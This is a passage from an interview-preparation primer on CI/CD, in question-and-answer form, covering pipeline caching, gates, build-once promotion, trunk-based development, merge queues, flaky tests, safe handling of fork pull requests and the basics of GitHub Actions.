**Risks and failure modes:**

- **Stale/poisoned cache** — a bad key can serve outdated or corrupt data, producing "works locally, fails in CI" mysteries. Fix by keying on content hashes, never a static key.
- **Correctness dependence** — never let the *build's correctness* depend on a cache hit; a cache miss must still produce a correct result (just slower). Caches get evicted routinely.
- **Cross-contamination** — a poorly scoped key shared across branches/PRs can leak state. Scope keys carefully, and be wary of untrusted fork PRs writing to caches.

The senior framing: cache is a **pure performance optimisation that must be transparent to correctness** — if turning caching off changes your build's *output* (not just its speed), the caching is wrong.

### Q10. What are gates and approvals in a pipeline, and where do you put them?

**Gates** are checkpoints between stages that a change must clear to proceed. They come in two flavours:

- **Automated gates** — the pipeline decides: tests pass, coverage threshold met, security scan clean, canary metrics healthy. These are the everyday gates and they're the *preferred* kind because they're consistent and fast.
- **Manual approvals** — a human clicks to proceed. This is exactly the **Continuous Delivery** production gate: every green build is releasable, and a person authorises the prod deploy.

In GitHub Actions, a manual gate is modelled with **environments + required reviewers**:

```yaml
jobs:
  deploy-prod:
    needs: deploy-staging
    environment: production      # requires configured reviewers to approve
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh production
```

GitLab uses `when: manual` jobs and protected environments.

Where to put them: **automated gates everywhere cheap** (unit tests before integration, scans before deploy), and a **manual approval only where human judgement genuinely adds value** — typically the prod boundary in a Continuous Delivery model, or a compliance sign-off. Over-gating with manual approvals slows delivery and re-introduces the release-anxiety CI/CD is meant to remove; automate the gate whenever a machine can make the call.

### Q11. What are fan-out and fan-in, and when would you use them?

**Fan-out** splits one job into many parallel jobs; **fan-in** converges many jobs back into one downstream job. Together they let you parallelise wide work and then aggregate.

Classic uses:

- **Test sharding** — fan out a large test suite across N parallel runners (each runs a slice), then fan in to collect coverage and report a single pass/fail. Turns a 40-minute suite into ~5 minutes.
- **Matrix builds** — fan out across OS/language versions, fan in to a "release" job that only runs if every matrix cell passed.
- **Multi-artifact builds** — build several services/architectures in parallel, fan in to a job that assembles or publishes them together.

```yaml
jobs:
  test:                              # fan-out via matrix
    strategy:
      matrix: { shard: [1, 2, 3, 4] }
    runs-on: ubuntu-latest
    steps:
      - run: npm test -- --shard=${{ matrix.shard }}/4
  report:                            # fan-in
    needs: test
    runs-on: ubuntu-latest
    steps:
      - run: ./merge-coverage.sh
```

The `needs: test` on the fan-in job waits for *all* matrix shards. Use fan-out/fan-in whenever work is embarrassingly parallel and you need a single downstream decision point — it's the primary lever for making slow pipelines fast.

### Q12. What are reusable pipeline templates and why use them?

Reusable templates let you define pipeline logic **once** and call it from many repos or jobs, instead of copy-pasting YAML everywhere.

- **GitHub Actions** — **reusable workflows** (`on: workflow_call`) and **composite actions**. A central `deploy.yml` is called by many repos with inputs.
- **GitLab CI** — `include:` (local, remote, or template files) and `extends:`/YAML anchors to share job definitions.

```yaml
# caller repo
jobs:
  deploy:
    uses: acme/ci-templates/.github/workflows/deploy.yml@v2
    with: { environment: production }
    secrets: inherit
```

Why it matters:

- **DRY + consistency** — every service deploys the same audited way; fix a bug or tighten a security scan in *one* place and every consumer inherits it.
- **Governance** — a platform team owns the golden-path template; product teams consume it without reinventing (or weakening) it.
- **Versioning** — pin to `@v2`; consumers upgrade deliberately, and you can roll back the template itself.

The trap to avoid: over-abstracting into a template so generic and parameter-heavy that it's harder to understand than the duplication it replaced. Templatise the *stable, security-relevant* golden path; let genuinely bespoke pipelines stay bespoke.

### Q13. What's the difference between a CI pipeline and a CD pipeline, and how do you combine them?

They're two halves of the path to production, often in one file but conceptually distinct:

- **CI pipeline** — everything up to and including producing a validated artifact: checkout → build → test → lint → scan → **package the immutable artifact**. Triggered on pushes and pull requests; its job is to *prove the change is sound and produce something deployable*. Its output is a green check and an artifact.
- **CD pipeline** — everything from that artifact to running in production: deploy to staging → integration/e2e → **gate** → deploy to prod (canary/blue-green) → verify. Its job is to *safely promote the artifact through environments*.

**Combining them:** the artifact is the handoff. The CI pipeline builds and publishes the immutable artifact; the CD pipeline picks up *that same artifact* and promotes it — the build-once principle is literally the seam between the two. In a single GitHub Actions workflow, CI jobs (`build`, `test`) feed a `package` job whose artifact the CD jobs (`deploy-staging`, `deploy-prod`) consume via `needs:`.

Keeping the distinction clear matters because they have different triggers, different failure consequences (a failed CI check blocks a merge; a failed CD deploy needs rollback), and often different ownership.

### Q14. Why do ephemeral build environments matter for reproducibility?

An **ephemeral** environment is a clean, throwaway runner created for a single pipeline run and destroyed after — the opposite of a long-lived build server that accumulates state.

Why it matters:

- **No snowflakes / no drift** — a persistent build agent slowly collects manually-installed tools, leftover files, and mutated global state until builds pass *only there* ("works on the build server"). Nobody can reproduce it. A fresh runner each time forces every dependency to be declared explicitly.
- **Reproducibility** — same clean starting state + same inputs → same output. That's the foundation of trusting that what passed tests is what ships.
- **Isolation / security** — one run can't leak secrets, caches, or artifacts into another. A compromised job doesn't poison the next build's environment. Critical for running untrusted fork PRs.
- **Parallelism** — throwaway environments scale horizontally; you spin up 50 for a matrix and tear them down.

The cost is speed — a clean environment re-fetches dependencies each run — which is exactly why **caching** exists (a transparent optimisation *on top of* ephemerality, not a replacement for it). The principle: **your pipeline should assume nothing about the machine it runs on** and rebuild the world from declared inputs every time.

### Q15. Here's a workflow that rebuilds the Docker image separately for staging and prod. What's wrong and how would you fix it?

```yaml
# PROBLEM: builds a different image for each environment
jobs:
  deploy-staging:
    steps:
      - uses: actions/checkout@v4
      - run: docker build -t app:staging . && ./deploy.sh staging app:staging
  deploy-prod:
    needs: deploy-staging
    steps:
      - uses: actions/checkout@v4
      - run: docker build -t app:prod . && ./deploy.sh prod app:prod
```

**What's wrong:** it violates **build-once**. `app:prod` is a *separate build* from `app:staging`, so what you validated in staging is **not** what ships to prod. Between the two builds, a base image could update, a dependency could float to a new version, or a transient fetch could differ — meaning your staging gate tested a different binary than production runs. It's also slower (two builds) and gives you no single traceable digest.

**The fix:** build the image **once**, tag it immutably (by git-sha), push to a registry, and *promote the same digest* to each environment. Config differs at deploy time, not the image.

```yaml
jobs:
  build:
    outputs: { image: ${{ steps.meta.outputs.image }} }
    steps:
      - uses: actions/checkout@v4
      - id: meta
        run: echo "image=ghcr.io/acme/app:${{ github.sha }}" >> "$GITHUB_OUTPUT"
      - run: docker build -t ${{ steps.meta.outputs.image }} . && docker push ${{ steps.meta.outputs.image }}
  deploy-staging:
    needs: build
    steps: [ { run: "./deploy.sh staging ${{ needs.build.outputs.image }}" } ]
  deploy-prod:
    needs: [build, deploy-staging]
    environment: production        # manual approval gate
    steps: [ { run: "./deploy.sh production ${{ needs.build.outputs.image }}" } ]
```

Same `github.sha` image promoted to both — now the thing you tested is the thing you ship.

### Q16. Design a pipeline for a containerized web service deployed to Kubernetes. Walk me through it.

I'd design it around build-once, a DAG for speed, and a gated promotion path.

**Trigger** — `pull_request` runs the CI gate; `push` to `main` runs the full path to prod.

**CI stage (on PR and main), parallel jobs:**
- `lint` and `unit-test` and `sast-scan` run concurrently (no dependencies).
- `build` compiles and produces a container image tagged `ghcr.io/acme/app:<git-sha>`, then pushes it to the registry. On PRs it can build without pushing to prod registry.

**Package (build-once):** the image is built exactly once here. Everything downstream references the immutable `<git-sha>` digest — no rebuilds. I'd also generate an SBOM and sign the image (cosign) for supply-chain integrity.

**Promotion stages (on main), sequential gates:**
1. `deploy-staging` — apply the manifest with the pinned image digest to the staging cluster (Helm/Kustomize).
2. `integration-e2e` — run integration and end-to-end tests against staging.
3. `deploy-prod` — behind an `environment: production` **manual approval** (Continuous Delivery). Roll out via **canary**: route a small traffic % to the new pods, watch SLO/error-rate metrics, ramp up on green, **auto-rollback** on a bad signal.

**Cross-cutting:** ephemeral runners, dependency caching keyed on the lockfile, `needs:` to parallelise, OIDC to assume the cloud/cluster role with short-lived creds (no long-lived kubeconfig secret), and least-privilege `permissions:` on the token.

**For GitOps** (my preference at scale): CI's job ends at *building and signing the image and committing the new digest to a config repo*; an in-cluster agent (ArgoCD/Flux) **pulls** that desired state and reconciles it — so the pipeline never holds cluster credentials at all. The key threads throughout: **one immutable artifact, promoted through gates, with a rollback path.**

## Continuous Integration Practices

### Summary

**What this topic covers**

The team habits that make Continuous Integration actually work — the practices, not the tooling. Three concern areas: (1) **branching and integration** — trunk-based development vs long-lived feature branches, why frequent integration is the heart of CI, and how feature flags let you merge incomplete work; (2) **keeping the mainline healthy** — keeping main green, branch protection, PR/merge-request checks, and stop-the-line culture when the build breaks; and (3) **flow and trust** — fast feedback, merge queues/merge trains for high-throughput teams, handling flaky tests, and the pre-merge vs post-merge question. The 16 questions here answer the interviewer's real probe: *are you doing CI, or do you just own a CI tool?* You can have flawless pipelines and still not be doing continuous integration if everyone branches for a week. This topic is where the "practice, not tool" theme from the fundamentals gets concrete and opinionated.

**Mental model**

CI is a **team discipline of integrating small changes into a shared, always-green mainline, frequently.** Picture main as a production line that everyone's work flows onto. Two forces keep it healthy. First, **integrate small and often**: each developer works on a short-lived branch (a day or two, max) and merges back before it drifts — so conflicts stay tiny and integration bugs surface immediately, one change at a time. Second, **the line must never stop being releasable**: main is always green, a broken build is a stop-the-line event that the whole team helps fix, and nothing merges without passing checks. The enemy is the **long-lived branch** — the longer code lives apart from main, the more it diverges, the worse the eventual merge, and the later you discover integration problems. Everything in this topic — trunk-based development, branch protection, merge queues, feature flags, killing flaky tests — is a tactic for keeping integration frequent and the mainline green under real-world throughput.

**Key terms**

- **Trunk-based development** — everyone commits to short-lived branches off `main` and merges within a day or two; no long-lived branches.
- **Long-lived feature branch** — a branch that lives for weeks; the anti-pattern CI exists to avoid (causes merge hell, delays integration).
- **Keeping main green** — the mainline is always in a releasable, passing state; a red build is an emergency.
- **Stop-the-line** — a broken build halts other work; fixing it is the team's top priority.
- **Branch protection** — rules on `main`: required status checks, required reviews, no direct pushes, up-to-date branches.
- **Required status checks** — CI jobs (build, test, lint, scan) that must pass before a PR can merge.
- **Merge queue / merge train** — serialises merges so main stays green even when many PRs land, by testing each against the others.
- **Feature flag** — a runtime toggle that lets you merge incomplete code dark, decoupling merge from release.
- **Fast feedback** — CI that runs in minutes; slow CI kills the practice by pushing people to batch.
- **Flaky test** — a test that passes/fails non-deterministically, eroding trust in CI.
- **Pre-merge CI** — checks run on the PR before merge (gate); **post-merge CI** — checks run on main after merge.
- **Squash vs merge commit** — collapsing a PR to one commit vs preserving its history on merge.

**Why interviewers ask this**

This is the topic that separates "we have GitHub Actions" from "we practise CI." Interviewers use it to test whether you understand CI as a *behavioural* discipline. The trunk-based vs feature-branch question is the classic probe — a candidate who defends week-long branches as normal reveals they've lived with merge hell and normalised it. Seniors talk about *keeping main green* as a team value, know why merge queues exist (two individually-green PRs can break when combined), and treat flaky tests as a trust emergency, not an annoyance. The feature-flag answer signals maturity: knowing you can *merge* incomplete work safely (decoupling merge from release) is what makes trunk-based development possible without shipping half-built features. Platform roles especially want to hear that you'd tune CI for *fast feedback*, because a slow pipeline silently destroys the whole practice.

**Common confusions**

- "CI means having a CI server run my branch" — CI means the *team* integrates to a shared mainline frequently. A per-branch build with rare merging isn't CI.
- "Trunk-based development means no branches / commit straight to main" — no; it means *short-lived* branches merged within a day or two, still via PRs and checks.
- "Feature branches and GitFlow are best practice" — long-lived branches delay integration and cause merge hell; they're the thing CI is designed to avoid.
- "A merge queue is the same as branch protection" — protection checks a PR in isolation; a merge queue re-tests PRs *combined* so main stays green under throughput.
- "Feature flags are only for A/B testing" — their CI role is decoupling merge from release, letting you land incomplete work dark.
- "Flaky tests are harmless, just re-run them" — flakiness erodes trust in CI until people ignore red builds; that's the practice dying.
- "Slow CI is fine, it's thorough" — slow CI pushes people to batch changes to avoid the wait, defeating frequent integration.

**What follows from this topic**

These practices are the human side of everything else in the primer. Keeping main green and PR checks build directly on **The Pipeline Model** (the pipeline is what enforces the required status checks). Feature flags reappear in deployment strategies as the tool that decouples deploy from release. Fast feedback ties back to the pipeline-speed techniques (parallelism, caching, sharding). And the whole topic is the concrete answer to the fundamentals claim that *CI is a practice, not a tool* — here's what the practice actually looks like day to day.

### Q1. What is trunk-based development and why is it central to CI?

**Trunk-based development** is a branching model where every developer commits to **short-lived branches off `main`** and merges back within a day or two — keeping a single shared trunk that's always releasable. No branch lives for weeks.

It's central to CI because CI *is* frequent integration, and trunk-based development is the branching strategy that makes frequent integration the default. When everyone merges to main daily, each integration is tiny: conflicts are small, and any integration bug surfaces immediately against the current mainline while it's cheap to fix. The shared trunk is the "continuously integrated" thing.

The contrast is the long-lived feature branch: code that lives apart from main for weeks diverges further every day, so the eventual merge is a painful archaeology exercise ("merge hell") and integration problems stay hidden until the very end — the exact risk CI was invented to remove.

The nuance interviewers want: trunk-based *doesn't* mean committing straight to main with no review. You still use short-lived PR branches with required checks — they just live for hours or a day, not weeks. Pair it with **feature flags** to keep incomplete work dark so a short-lived branch can merge before the feature is finished.

### Q2. Trunk-based development vs GitFlow / long-lived feature branches — compare them.

| | Trunk-based development | Long-lived branches / GitFlow |
|---|---|---|
| Branch lifetime | hours to ~2 days | days to weeks |
| Integration frequency | continuous (daily merges to main) | deferred to the end |
| Merge conflicts | tiny and frequent | large and rare ("merge hell") |
| Integration bugs | surface immediately, one change deep | discovered late, tangled together |
| Incomplete work | merged dark behind feature flags | held on the branch until "done" |
| Fits CI/CD | yes — it *is* frequent integration | no — defers integration, the opposite of CI |
| Best for | most product teams wanting flow | rare cases: strict release trains, OSS with untrusted contributors |

**Trunk-based** optimises for *flow and early integration*. **GitFlow** (with its `develop`, `release`, `feature`, `hotfix` branches) optimises for *heavily-scheduled, versioned releases* and was designed for a different era — desktop software with infrequent releases.

The senior take: GitFlow's long-lived branches are fundamentally at odds with CI. Every day a feature branch lives, it diverges from main, so the integration you were supposed to be doing *continuously* is deferred to a big, risky merge. For teams practising CI/CD, trunk-based development is the default; GitFlow survives mainly in contexts with genuine release trains or where you must gate untrusted external contributions.

### Q3. Why is long-lived branching such a problem? Isn't isolation a good thing?

Isolation *feels* safe — your half-finished work can't break anyone else's — but it trades a small, immediate cost for a large, deferred one, which is exactly backwards.

The problems compound with branch age:

- **Merge hell** — every day your branch lives, main moves on. The divergence grows non-linearly; a two-week branch can be a multi-day merge with subtle conflicts you resolve *without* the original context.
- **Deferred integration = hidden bugs** — CI's whole value is finding integration problems *early*. A long branch means your code and main are only actually integrated at the very end — the most expensive moment to discover a conflict of assumptions.
- **Big batch** — the branch merges as one giant change, so it inherits every big-batch risk: hard to review, hard to isolate failures, terrifying to roll back.
- **"Semantic" conflicts git can't see** — two branches can each edit different files, merge cleanly, and still break because they changed the same *behaviour* — only caught when finally integrated.

The reframe: the "isolation" is an illusion of safety. You haven't avoided the integration cost, you've **deferred and amplified** it. CI says pay it continuously in tiny increments instead. The one-liner: *"you're not doing CI if you branch for a week."*

### Q4. What does "keeping main green" mean and whose job is it to fix a red build?

**Keeping main green** means the mainline is *always* in a passing, releasable state — the build succeeds, tests pass, and you could cut a release from any commit on main at any moment. It's the core invariant CI protects.

Why it matters: if main is red, everyone building on top of it inherits the breakage, can't trust their own test results, and can't release. A red main blocks the whole team, so it's treated as an emergency.

Whose job is it to fix? **The whole team's — it's stop-the-line.** The Toyota "Andon cord" analogy is deliberate: a broken build halts other work, and fixing it is the top priority over new features. Practically, the person whose change broke it leads the fix (they have the context), but the team owns the outcome — if they're unavailable, the change gets **reverted** immediately to restore green, and the fix rolls forward later. The anti-pattern to name: a main that stays red for hours or days while people work around it. That's the practice dying — the mainline is no longer a trustworthy, releasable trunk, so you've lost the "integration" in continuous integration.

### Q5. What branch protection rules would you put on main?

The rules that make "keeping main green" enforceable rather than aspirational:

- **Required status checks** — build, unit tests, lint, and security scans must pass before merge. This is the core gate.
- **Require branches be up to date** — the PR must be tested against the *current* main (or routed through a merge queue) so you don't merge something that was green against stale main.
- **Required reviews** — at least one approving review (often with code-owner rules for sensitive paths).
- **No direct pushes to main** — all changes go through a PR; nobody bypasses the checks. Include admins.
- **Require conversation resolution** — review threads resolved before merge.
- **Optionally: signed commits, linear history, required deployments** for regulated/high-assurance repos.

```text
main:
  require_pull_request:        true
  required_approving_reviews:  1
  required_status_checks:      [build, test, lint, security-scan]
  strict_up_to_date:           true          # re-test against latest main
  enforce_admins:              true
  allow_force_pushes:          false
  require_conversation_resolution: true
```

The principle: **make the safe path the only path.** If it's *possible* to push a broken change straight to main, eventually someone will. Branch protection turns the CI discipline into something the platform enforces, not something you trust people to remember.

### Q6. What checks should pass before a PR can merge, and why gate at merge time?

The pre-merge gate should run, in parallel for speed:

- **Build** — the change compiles/bundles.
- **Unit + integration tests** — behaviour is correct.
- **Lint / format** — style and static-analysis rules.
- **Security scan** — SAST, dependency/vulnerability scan, secret detection.
- **(Sometimes) coverage threshold, license check, or a smoke deploy to a preview environment.**

Why gate at *merge* time specifically: because **main must stay green**, and the cheapest place to stop a bad change is *before* it contaminates the shared trunk. If checks only ran post-merge, a broken change would already be on main, blocking everyone and requiring a revert — you've turned a private failure into a team-wide one.

The design tension is **speed vs thoroughness**: the pre-merge gate must be *fast* (minutes) or it becomes a bottleneck that pushes people to batch. So you put the fast, high-signal checks pre-merge (unit tests, lint, quick integration) and can defer slower, expensive suites (full e2e, load tests, cross-browser matrices) to post-merge or scheduled runs. The rule: **gate on what's fast and catches the most bugs; don't let a 40-minute suite hold every merge hostage.**

### Q7. Why does CI feedback speed matter so much, and how do you keep it fast?

Because **slow CI silently kills the practice.** If the pipeline takes 45 minutes, developers stop integrating frequently — they batch changes to avoid paying the wait repeatedly, branches live longer, and you're back to big-batch, deferred-integration risk. Slow feedback also means a developer has context-switched away by the time results arrive, so fixing a failure costs a context reload. Fast feedback (minutes, not hours) is what makes frequent integration *painless enough to actually do*.

How to keep it fast:

- **Parallelise** — model the pipeline as a DAG; run lint, unit tests, and scans concurrently, not in sequence.
- **Shard tests** — fan out a big suite across N runners (test sharding), fan in to report.
- **Cache** — dependencies and build caches keyed on the lockfile, so you don't re-fetch/rebuild the world each run.
- **Split the pipeline** — fast, high-signal checks (unit, lint) gate the PR; slow suites (full e2e, load) run post-merge or nightly.
- **Fail fast** on the linear path — don't run e2e if unit tests already failed.
- **Right-size runners** and use incremental builds where the toolchain supports it.

The metric to watch is **PR feedback time** (commit → checks done). Treat a regression in it as a real bug in the platform — target keeping it under ~10 minutes for the pre-merge gate.

### Q8. What is a merge queue (or merge train) and what problem does it solve?

A **merge queue** (GitHub) / **merge train** (GitLab) serialises merges so that main stays green *even under high merge throughput.*

The problem it solves is subtle and important: **two PRs can each be green individually but break when combined.** PR A and PR B both pass CI against the current main. But A wasn't tested *with* B's changes. Merge both and main can go red — a *semantic* conflict git's merge didn't catch (A renames a function B calls; A and B both add a route with the same path). With enough contributors, this happens constantly, and requiring every PR to be re-based and re-tested against the latest main manually creates a thundering-herd race where PRs invalidate each other.

The queue fixes it by **testing each PR against the resulting state of the ones ahead of it**, in order, and merging only if that combined state is green:

```text
queue: [PR-A, PR-B, PR-C]
  test A on top of main            -> green -> merge A
  test B on top of main+A          -> green -> merge B
  test C on top of main+A+B        -> red   -> eject C, notify author
```

It can batch/parallelise speculatively for throughput. The payoff: main stays green under load without developers manually rebasing and re-testing all day. You reach for it when merge volume is high enough that "keep your branch up to date and re-run CI" stops scaling.

### Q9. How do feature flags let you merge incomplete work, and why is that valuable?

A **feature flag** is a runtime toggle that gates a code path. You merge the new code to main but keep it **off in production** — it's shipped "dark." The value in a CI context is that flags **decouple merge from release**: you can integrate incomplete work continuously without exposing a half-built feature to users.

Why that's the linchpin of trunk-based development: the objection to short-lived branches is "but my feature takes two weeks — I *have* to keep it on a branch until it's done." Feature flags dissolve that. You merge small, incomplete slices to main daily, each behind a flag that's off. The code integrates continuously (so no merge hell, no deferred integration), but the feature only *activates* when you flip the flag — a separate, controlled decision, often a gradual rollout.

```ts
if (flags.isEnabled("new-checkout", user)) {
  return renderNewCheckout();   // merged but dark until the flag is flipped
}
return renderLegacyCheckout();
```

Extra payoffs: the flag doubles as a **kill switch** (turn a bad feature off instantly without a deploy/rollback) and enables **canary/percentage rollouts** and A/B tests. The cost to manage: flags are debt — you must *remove* them once a feature is fully rolled out, or you accumulate a maze of stale toggles and untested code-path combinations.

### Q10. Pre-merge CI vs post-merge CI — what runs where?

Two moments to run checks, with different jobs:

- **Pre-merge (on the PR)** — the **gate**. Fast, high-signal checks that must pass before the change touches main: build, unit tests, lint, security scan, quick integration tests. Purpose: keep broken changes *off* the shared trunk. Constraint: must be fast, because it blocks every merge.
- **Post-merge (on main after merge)** — the **safety net and heavier validation**. Runs after the change lands: full end-to-end suites, load/performance tests, cross-browser/cross-platform matrices, deploy-to-staging, nightly security scans. Purpose: catch what's too slow or expensive to gate on, and validate the *actual integrated* main.

Why split them: you can't put a 40-minute e2e suite pre-merge without destroying feedback speed and creating a merge bottleneck — so slow-but-valuable checks go post-merge. The risk of post-merge checks is that a failure is already *on main*, so it must trigger a **fast, loud response** (alert, and often auto-revert) to restore green quickly.

The design goal: **pre-merge catches the most bugs per second of wait; post-merge catches the rest without holding merges hostage.** A merge queue blurs the line usefully — it runs the gate against the *combined* future state, giving pre-merge confidence about the post-merge result.

### Q11. How do you handle flaky tests, and why are they dangerous?

A **flaky test** passes or fails non-deterministically on the *same* code — usually from timing/races, test-order dependence, shared state, network calls, or reliance on wall-clock/random values.

Why they're dangerous — this is the key insight: **flakiness erodes trust in CI, and once people stop trusting red, the practice is dead.** If a red build is *often* just flake, developers start reflexively hitting "re-run" until it goes green — which means they also wave through *real* failures the same way. The signal-to-noise of your entire test suite collapses. A little flakiness poisons the whole gate.

How to handle it, in order:

1. **Make it visible** — track flaky tests explicitly; don't let them hide. Many CI systems flag tests that pass on re-run.
2. **Quarantine, don't ignore** — move a known-flaky test out of the blocking gate (into a non-required, tracked suite) so it stops blocking merges *while* you fix it. Quarantine is a holding cell with a deadline, not a graveyard.
3. **Fix the root cause** — remove the race/order-dependence/external call; make tests hermetic and deterministic. Flakiness is almost always a real test-design bug.
4. **Resist blanket auto-retry** — retrying green-until-passing masks flakiness and lets it accumulate; use it sparingly and always with tracking.

The senior framing: treat flaky tests as a **trust emergency**, budget time to fix them, and enforce that a test either earns its place in the blocking gate by being reliable or gets quarantined until it does.

### Q12. Why do code review and CI go together, and what does each catch?

They're complementary gates on the same PR, catching *different* classes of problem:

- **CI catches the objective and mechanical** — does it compile, do tests pass, does it lint, are there known vulnerabilities or leaked secrets? Anything a machine can verify deterministically. CI is tireless and consistent but only knows what you've told it to check.
- **Code review catches the subjective and contextual** — is this the *right* design? Is it readable and maintainable? Does it fit the architecture, handle the edge case the author forgot, introduce a subtle security/logic flaw, or lack a test for the tricky path? Human judgement about *intent and quality*.

Together they form a two-layer gate: CI proves the change is *correct and safe by machine standards*; review proves it's *good by human standards*. Neither replaces the other — CI can't tell you a passing implementation is a bad idea, and a reviewer shouldn't be manually checking whether tests pass (that's the machine's job, and it frees the reviewer to focus on judgement).

The workflow encodes this: branch protection requires *both* a green CI status *and* an approving review before merge. A senior point: keeping reviews *small and fast* is itself a CI practice — small PRs (a natural consequence of trunk-based development) get reviewed quickly, which keeps integration frequent. Giant PRs get rubber-stamped, defeating the review.

### Q13. "You're not doing CI if you branch for a week." Defend or refute this.

**Defend it — it's essentially correct**, and the phrasing (from Continuous Delivery advocates) is deliberately provocative to make the point.

The argument: **CI is defined by frequent integration to a shared mainline** — that's literally what "continuous integration" *means*. If your code lives on a branch for a week before touching main, then for that whole week it is *not integrated* with everyone else's work. You might run a CI *server* on your branch, but you're not doing the *practice* of continuous integration — you're deferring integration to a weekly big-bang merge, which is exactly what CI was invented to eliminate. Owning the tool isn't the same as doing the practice.

The honest nuance (not a refutation, a boundary): "a week" is shorthand for "long-lived." The real threshold is that branches should be *short* — hours to a day or two — and integrated frequently. There are narrow contexts where longer-lived branches are legitimate: open-source projects taking PRs from untrusted external contributors, or genuine release-train models. But for a co-located product team, a week-long branch means you've swapped continuous integration for periodic integration, and inherited merge hell and hidden integration bugs as the price.

So: defend the spirit. The way to have both small branches *and* multi-day features is **feature flags** — merge incomplete work dark, integrating continuously while releasing on your own schedule.

### Q14. Squash vs merge commits — how does the choice interact with CI?

Two ways to land a PR onto main:

- **Squash merge** — collapse all of a PR's commits into a *single* commit on main. Main's history becomes one clean commit per PR.
- **Merge commit** — preserve the PR's individual commits and add a merge commit tying the branch into main. Full history is retained.

How it interacts with CI/trunk-based development:

- **Squash reinforces small-batch thinking and clean bisecting.** One commit per PR means `git bisect` lands on a whole, reviewed, CI-green change — easy to reason about and revert atomically. It suits trunk-based development, where a PR *is* the unit of integration. The cost: you lose the intermediate commit granularity (fine, since the branch was short-lived anyway).
- **Merge commits preserve detailed history** but can clutter main with WIP commits ("fix typo", "address review") that were never individually CI-gated or meaningful — noisy for bisect and blame.
- **Rebase-and-merge** is a middle path: replays the PR's commits onto main linearly, keeping granularity without a merge commit, but each replayed commit wasn't necessarily tested in isolation.

The common trunk-based default is **squash merge**: it maps one PR to one atomic, revertable, CI-validated commit, keeps main's history linear and readable, and matches the small-batch discipline. Preserve full history only when the individual commits genuinely carry value (e.g. carefully-curated commit series in some OSS projects).

### Q15. How should CI handle pull requests from forks safely?

Fork PRs are the classic **untrusted-input** problem: an external contributor's code runs in *your* CI. The danger is a **poisoned pipeline** — malicious PR code that exfiltrates your secrets or abuses your cloud credentials during the CI run.

The core rule: **fork PRs must run without access to your secrets.** In GitHub Actions, the safe `pull_request` trigger runs the workflow in the *fork's* context with a **read-only token and no secrets exposed** — so even malicious code can't steal anything. The footgun is **`pull_request_target`**, which runs the workflow in the *base repo's* context *with* secrets and write access. If you use it and then check out and execute the PR's code, untrusted code runs with your credentials — a well-known exfiltration vector.

Safe practices:

- **Default to `pull_request`** for fork validation; accept that it has no secrets and can't deploy.
- **Never check out and run untrusted PR code under `pull_request_target`.** Use `pull_request_target` only for jobs that *don't* execute PR code (e.g. labelling), and never combine it with checking out the head ref and running it.
- **Require maintainer approval** to run workflows on first-time-contributor PRs (a GitHub setting).
- **Least privilege** — set `permissions:` to the minimum; use short-lived OIDC creds, not long-lived cloud keys, so there's less to steal.
- **Gate secret-requiring steps** (deploys, integration tests needing real creds) behind trusted, post-merge or maintainer-triggered runs.

```yaml
on:
  pull_request:            # safe: fork PRs run with no secrets, read-only token
permissions:
  contents: read           # least privilege
```

The principle: **treat every fork PR as hostile code**, and make sure the CI it runs in has nothing worth stealing.

### Q16. Why prefer small PRs, and how do they reinforce the whole CI practice?

Small PRs are the connective tissue of CI — they make every other practice work:

- **Faster, better review** — a 50-line diff gets a genuine review in minutes; a 2,000-line diff gets rubber-stamped because nobody can hold it all in their head. Small PRs actually get the human scrutiny CI's review gate promises.
- **Faster feedback + faster merge** — small changes build and test quickly and merge quickly, keeping integration *frequent*, which is the definition of CI.
- **Smaller blast radius** — if a small PR breaks main, the cause is obvious and the revert is trivial. This is what keeps main green and MTTR low.
- **Enables trunk-based development** — small PRs *are* short-lived branches. You can't do daily integration with giant changes; small PRs make merging-within-a-day realistic.
- **Lower merge-conflict risk** — less code, less surface for conflicts, and it's on main before it can diverge.

The tension is that some work is genuinely large — and the resolution is the recurring theme: **feature flags** let you slice a big feature into many small, individually-mergeable, dark PRs, so "the feature is big" never forces "the PR is big."

The one-liner for interview: **small PRs are how you get frequent integration, fast feedback, easy review, and easy rollback simultaneously** — they're not a style preference, they're the mechanism that makes CI's other practices achievable. It all reduces to the same master variable from the fundamentals: *batch size.*
## GitHub Actions Fundamentals

### Summary

**What this topic covers**

GitHub Actions is the CI/CD system built into GitHub — the one most engineers meet first because it lives next to the code with no separate server to run. This topic covers the execution model from the outside in: a **workflow** (a YAML file in `.github/workflows/`) is triggered by an **event**, contains one or more **jobs**, and each job runs a sequence of **steps** on a **runner**. It covers the `on:` triggers that start a workflow, the runner model (GitHub-hosted ephemeral VMs vs self-hosted), the two kinds of steps (`uses:` an action vs `run:` a shell command), **contexts and expressions** (`${{ ... }}`), how you pass data between jobs (`needs`, `outputs`, artifacts), the auto-provided `GITHUB_TOKEN` and its `permissions:`, secrets and environment variables, caching, and the security hygiene of pinning third-party actions. The 17 questions here take you from "what is a workflow" to writing a real build-and-test pipeline and reasoning about why you pin actions by commit SHA. The deeper mechanics — matrix builds, reusable workflows, OIDC, `pull_request_target` — live in the next topic.

**Mental model**

Think of a workflow as an **event-driven graph of isolated machines**. Something happens in the repo (a push, a PR opened, a cron tick, a manual click), GitHub matches it against every workflow's `on:` block, and starts the ones that match. Each job in that workflow is handed a **fresh, clean virtual machine** — no state from your last run, nothing checked out, not even your code until `actions/checkout` runs. Jobs are independent islands that run **in parallel** unless you wire them together with `needs:`; within a job, steps run **sequentially** and share the same filesystem and environment. Because the VM is ephemeral and thrown away at the end, anything you want to keep — build outputs, coverage reports, a compiled binary — must be explicitly uploaded as an **artifact** or written to a **cache**. The whole system is declarative: you describe what should happen on which event, and GitHub schedules the machines. Getting this "clean VM per job, parallel by default, nothing persists" model right is what separates people who fight the tool from people who use it.

**Key terms**

- **Workflow** — a YAML file in `.github/workflows/` describing an automated process; triggered by events.
- **Event / trigger (`on:`)** — what starts a workflow: `push`, `pull_request`, `workflow_dispatch`, `schedule`, and more.
- **Job** — a set of steps that run on one runner; jobs run in parallel unless ordered with `needs:`.
- **Step** — a single task in a job; either `uses:` an action or `run:` a shell command.
- **Runner** — the machine that executes a job; GitHub-hosted (ubuntu/windows/macos, fresh VM per job) or self-hosted.
- **Action** — a reusable unit invoked via `uses:`; can be JavaScript, Docker, or composite.
- **Context** — structured run data exposed as objects: `github`, `env`, `secrets`, `job`, `steps`, `needs`.
- **Expression** — `${{ ... }}` syntax evaluating contexts, functions, and operators; drives `if:` conditionals.
